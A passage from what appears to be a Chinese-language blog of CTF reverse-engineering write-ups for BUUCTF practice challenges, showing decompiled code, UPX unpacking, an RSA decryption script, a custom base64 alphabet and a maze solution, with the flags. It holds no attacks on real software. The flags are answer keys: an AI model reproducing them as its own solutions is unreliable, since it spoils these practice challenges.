class="built_in">print</span> (<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>]))  </span><br></pre></td></tr></table></figure>



<p>最后得到flag,MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}</p>
<p>​                       但是我们再上交BUUCTF的时候为flag{Tr4nsp0sltiON_Clph3r_1s_3z}</p>
<h2 id="WUSTCTF2020-level21"><a href="#WUSTCTF2020-level21" class="headerlink" title="[WUSTCTF2020]level21"></a>[WUSTCTF2020]level21</h2><p>2024.4.6</p>
<p>  32位，有壳</p>
<p>​                                              upx脱一下壳子</p>
<p>​                                  [使用upx脱壳工具脱壳-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53532337/article/details/120571437#:~:text=%E8%84%B1%E5%A3%B3">https://blog.csdn.net/qq_53532337/article/details/120571437#:~:text=脱壳</a> 首先安装工具，解压完之后进入到最里层文件夹中复制下来此时的地址，cmd打开命令行先cd把地址转换，之后直接输入upx.exe,-h安装完成 会出现这样（一大串） 之后就可以脱壳了，还在这个窗口，因为刚刚已经把地址转到了upx脱壳工具这里了，所以这下不用再转，（下次打开需要重新转）)</p>
<p>​                          </p>
<p>我们用ida打开，F5反汇编，看一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444199.png" alt="image-20240406204223468"></p>
<p>啊？点一下了main函数，就看见了flag，都不用反汇编。</p>
<p>​                                           wctf2020{Just_upx_-d} </p>
<p>行！</p>
<h2 id="SUCTF2019-SignIn1"><a href="#SUCTF2019-SignIn1" class="headerlink" title="[SUCTF2019]SignIn1"></a>[SUCTF2019]SignIn1</h2><p>2024.4，7</p>
<p>64位，无壳</p>
<p>​                         进去找到main函数，F5进行反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[sign in]&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[input your flag]: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%99s&quot;</span>, v8);</span><br><span class="line"><span class="comment">//输入99个字符</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">  sub_96A(v8, v9);</span><br><span class="line"><span class="comment">//这里v8.v9进行了一个函数变换</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////</span></span><br><span class="line">  __gmpz_init_set_str(v7, <span class="string">&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;</span>, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v6, v9, <span class="number">16LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v4, <span class="string">&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_init_set_str(v5, <span class="string">&quot;65537&quot;</span>, <span class="number">10LL</span>);</span><br><span class="line">  __gmpz_powm(v6, v6, v5, v4);</span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__gmpz_cmp(v6, v7) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);<span class="comment">//这里应该就是结束的部分</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;TTTTTTTTTTql!&quot;</span>);</span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据上面的函数，应该猜出v6和v7相等的时候，为我们所要的结果</p>
<p>我们知道了v7的值为<strong>ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</strong>（64位，可能位base64）</p>
<p>​       还知道v4的值为<strong>103461035900816914121390101299049044413950405173712170434161686539878160984549</strong></p>
<p>​       和v5的值为<strong>65537</strong></p>
<p>这里就没什么思路了，上网搜了一下结果是在这里有个加密</p>
<p>​           __gmpz_powm(v6, v6, v5, v4);</p>
<p>上网搜索一下_gmpz_powm函数</p>
<p>​                                             <a target="_blank" rel="noopener" href="https://blog.csdn.net/yhfgs/article/details/117422505">buuctf——（SUCTF2019）SignIn-CSDN博客</a></p>
<p>​     加密方法和rsa一样，上网找找脚本</p>
<p> 首先知道密文为c&#x3D;<strong>ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</strong></p>
<p>​                模数n&#x3D;<strong>103461035900816914121390101299049044413950405173712170434161686539878160984549</strong></p>
<p>​                指数e&#x3D;<strong>65537</strong></p>
<p>​                </p>
<p>再用在线工具求p和q。</p>
<p>然后进行大素数的分解</p>
<p>链接: <a target="_blank" rel="noopener" href="http://factordb.com/index.php">http://factordb.com/index.php</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607900.png" alt="image-20240407182457612"></p>
<p>我们知道了p和q</p>
<p>   p&#x3D;282164587459512124844245113950593348271</p>
<p>   q&#x3D;366669102002966856876605669837014229419</p>
<p>找一下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p=<span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q=<span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">c =<span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>​                                          suctf{Pwn_@_hundred_years}</p>
<p>​               这里跟我前面做的rsa题目基本一模一样，只是密文改了！</p>
<p>​               我们应该改为flag{Pwn_@_hundred_years}</p>
<h2 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h2><p>2024.4.7</p>
<p>32位，无壳。</p>
<p>找到main函数，F5进行反汇编，看一下函数整体不长。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  sub_403CF8(&amp;unk_40E140);</span><br><span class="line">  scanf(<span class="string">&quot;%s&quot;</span>, v8);</span><br><span class="line">  memset(v5, <span class="number">0</span>, sizeof(v5));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401080(v8, strlen(v8), v5);</span><br><span class="line"><span class="comment">##上面的函数为base64编码的函数，但是我们根据下面的算法，它其实是base64的换表</span></span><br><span class="line"><span class="comment">##但是它在后面加了一个return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#######################################################</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v5 + v3) == byte_40E0E4[v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v3 &gt; strlen((const char *)v5) )</span><br><span class="line">      goto LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_403CF8(aError);</span><br><span class="line">LABEL_6:</span><br><span class="line">  <span class="keyword">if</span> ( v3 - <span class="number">1</span> == strlen(byte_40E0E4) )</span><br><span class="line">    <span class="keyword">return</span> sub_403CF8(aAreYouHappyYes);<span class="comment">####这个点开看后它告诉你是yes，为我们所求</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_403CF8(aAreYouHappyNo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>随便点了一点</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444316.png" alt="image-20240407193237816"></p>
<p>看见了一个密文还有一个类似base64编码的字符串，其实他是运用了一下base64换表。（这里可以用在线文件解密也可以用脚本跑一下，gpt写也行。）</p>
<p>仔细分析一下最主要的部分就在下面的函数里。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607901.png" alt="image-20240408104947416"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401080</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  sub_401000();</span><br><span class="line">  v5 = a2 % <span class="number">3</span>;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a2 - a2 % <span class="number">3</span>;</span><br><span class="line">  v15 = a2 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v5) = *(_BYTE *)(a1 + v3);</span><br><span class="line">      v3 += <span class="number">3</span>;</span><br><span class="line">      v8 = v4 + <span class="number">1</span>;</span><br><span class="line">      a3[v8 - <span class="number">1</span>] = byte_40E0A0[(v5 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">      a3[v8++] = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(a1 + v3 - <span class="number">3</span>) &amp; <span class="number">3</span>) + (((<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(a1 + v3 - <span class="number">2</span>) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">      a3[v8++] = byte_40E0A0[<span class="number">4</span> * (*(_BYTE *)(a1 + v3 - <span class="number">2</span>) &amp; <span class="number">0xF</span>) + (((<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(a1 + v3 - <span class="number">1</span>) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>)];</span><br><span class="line">      v5 = *(_BYTE *)(a1 + v3 - <span class="number">1</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">      v4 = v8 + <span class="number">1</span>;</span><br><span class="line">      a3[v4 - <span class="number">1</span>] = byte_40E0A0[v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; v7 );</span><br><span class="line">    v5 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v7) = *(_BYTE *)(v3 + a1);</span><br><span class="line">    v9 = v4 + <span class="number">1</span>;</span><br><span class="line">    a3[v9 - <span class="number">1</span>] = byte_40E0A0[(v7 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v10 = v9 + <span class="number">1</span>;</span><br><span class="line">    a3[v10 - <span class="number">1</span>] = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(v3 + a1) &amp; <span class="number">3</span>)];</span><br><span class="line">    a3[v10] = <span class="number">61</span>;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v13 = v10 + <span class="number">1</span>;</span><br><span class="line">    a3[v13] = <span class="number">61</span>;</span><br><span class="line">    v4 = v13 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v4 + <span class="number">1</span>;</span><br><span class="line">    a3[v11 - <span class="number">1</span>] = byte_40E0A0[((<span class="type">int</span>)*(<span class="type">unsigned</span> __int8 *)(v3 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v12 = (_BYTE *)(v3 + a1 + <span class="number">1</span>);</span><br><span class="line">    LOBYTE(v6) = *v12;</span><br><span class="line">    v10 = v11 + <span class="number">1</span>;</span><br><span class="line">    a3[v10 - <span class="number">1</span>] = byte_40E0A0[<span class="number">16</span> * (*(_BYTE *)(v3 + a1) &amp; <span class="number">3</span>) + ((v6 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>)];</span><br><span class="line">    a3[v10] = byte_40E0A0[<span class="number">4</span> * (*v12 &amp; <span class="number">0xF</span>)];</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">  a3[v4] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_401030(a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下就是一个base64编码，但是他在这里用了一些加密。</p>
<p>分别在</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444254.png" alt="image-20240408105209738"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401000</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( result = <span class="number">6</span>; result &lt; <span class="number">15</span>; ++result )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = byte_40E0AA[result];</span><br><span class="line">    byte_40E0AA[result] = byte_40E0A0[result];</span><br><span class="line">    byte_40E0A0[result] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>和</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444437.png" alt="image-20240407202951008"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401030</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = a1[HIDWORD(v1)];</span><br><span class="line">      <span class="keyword">if</span> ( v2 &lt; <span class="number">97</span> || v2 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt; <span class="number">65</span> || v2 &gt; <span class="number">90</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        LOBYTE(v1) = v2 + <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(v1) = v2 - <span class="number">32</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      a1[HIDWORD(v1)] = v1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">      ++HIDWORD(v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( HIDWORD(v1) &lt; <span class="built_in">strlen</span>(a1) );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>chat一下就可以知道，它分别是一个base64的换表和密文的转换大小写</p>
<p>所以我们就可以进行解密了。</p>
<p>已知密文&#x3D;MXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</p>
<p>  然后逆向的时候就是先进行转换，在进行换表</p>
<p>转换后的密文为&#x3D;mxhZ3tLGNXlXjHhfaDTzN2FfK3LycRTpc2L9</p>
<p>但是解密不出来，所以我看了一下wp，发现不对密文少写了个z</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444838.png" alt="image-20240407205631247"></p>
<p>所以真正的密文为zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9</p>
<p>转换大小写后为ZmxhZ3tiGNXlXjHfaDTzN2FfK3LycRTpc2L9</p>
<p>换表的时候要注意在</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444817.png" alt="image-20240407210258641"></p>
<p>分析一下byte_40E0A0&#x3D;”ABCDEFGHIJ”和byte_40E0AA&#x3D;”KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;“</p>
<p>这里有一个换表，我们chat一下就应该知道是</p>
<p>这个函数对加密表进行变换，将 下标为 6 到14 的值 与 16 到24 的值进行调换</p>
<p>换表后为ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</p>
<p>可以进行在线解密了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607902.png" alt="image-20240408112424367"></p>
<p>所以flag为            flag{bAse64_h2s_a_Surprise}</p>
<h2 id="HDCTF2019-Maze1"><a href="#HDCTF2019-Maze1" class="headerlink" title="[HDCTF2019]Maze1"></a>[HDCTF2019]Maze1</h2><p>2024.4.9</p>
<p>32位，有壳</p>
<p>   upx脱个壳（脱壳不成功可以重命名一下），拖入ida看一看，没有找到main函数</p>
<p>搜索一下flag，</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444651.png" alt="image-20240409194834685"></p>
<p>看见最上面的一段话</p>
<p>Go through the maze to get the flag（经过迷宫找到flag）</p>
<p>​                               所以我们知道了是一个迷宫题。</p>
<p>​                               找一下迷宫在哪，不太好找，上网wp搜一下，</p>
<p>查看一下字符串，是这个，现在就是不知道迷宫的大小。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607903.png" alt="image-20240409195558183"></p>
<p>在上网看看</p>
<p>看一下别人的wp，知道了为什么F5反汇编不了</p>
<p>​                                     [【CTF】花指令问题——<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2320378">HDCTF2019]Maze-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>学一下nop指令</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444016.png" alt="image-20240409202238611"></p>
<p>重启之后就可以正常的F5反编译了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  sub_401140(aGoThroughTheMa);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%14s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">13</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v5[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        --dword_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        ++dword_408078;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        --dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        ++dword_40807C;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_408078 == <span class="number">5</span> &amp;&amp; dword_40807C == <span class="number">-4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401140(aCongratulation);</span><br><span class="line">    sub_401140(aHereIsTheFlagF);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401140(aTryAgain);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到了怎么走迷宫，也很简单”awsd”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//把那串迷宫复制下来</span></span><br><span class="line"><span class="comment">//*******+**</span></span><br><span class="line"><span class="comment">//******* **</span></span><br><span class="line"><span class="comment">//****    **</span></span><br><span class="line"><span class="comment">//**   *****</span></span><br><span class="line"><span class="comment">//** **F****</span></span><br><span class="line"><span class="comment">//**    ****</span></span><br><span class="line"><span class="comment">//**********</span></span><br><span class="line"><span class="comment">//总公七十个字符（算空格），所以每行十个。</span></span><br><span class="line"><span class="comment">//所以根据上面的“awsd”走一下。</span></span><br><span class="line"><span class="comment">//&quot;ssaaasaassdddw&quot;,无非就是+走到F，或F走到+,试一试。</span></span><br></pre></td></tr></table></figure>



<p>所以flag{ssaaasaassdddw}</p>
<h3 id="花指令实现及清除"><a href="#花指令实现及清除" class="headerlink" title="花指令实现及清除"></a>花指令实现及清除</h3><p>​               <a target="_blank" rel="noopener" href="https://blog.csdn.net/abel_big_xu/article/details/117927674">逆向分析基础 — 花指令实现及清除_jmp花指令逆向-CSDN博客</a></p>
<p>看了也没看，等等看</p>
<h2 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h2><p>2024.4.10</p>
<p>32位，无壳</p>
<p>​               打开，F5反汇编失败</p>
<p>这里的报错为 </p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444863.png" alt="image-20240410180155180"></p>
<p>我们找下这个地址40195</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444255.png" alt="image-20240410180233193"></p>
<p>点进去</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444493.png" alt="image-20240410180254254"></p>
<p>然后F5反汇编，发现是可以反汇编的。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444273.png" alt="image-20240410180320803"></p>
<p>最后我们进行一下X跟进一下sub 401020函数就可以正常使用了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031445453.png" alt="image-20240410180426120"></p>
<p>函数比较简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  sub_401020((<span class="type">int</span>)<span class="string">&quot;Give Me Your Flag String:\n&quot;</span>);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, byte_4212C0);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(byte_4212C0) != <span class="number">27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">    sub_401020((<span class="type">int</span>)<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    sub_404B7E(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    _loaddll(<span class="number">0</span>);</span><br><span class="line">    __debugbreak();</span><br><span class="line">  &#125;</span><br><span class="line">   <span 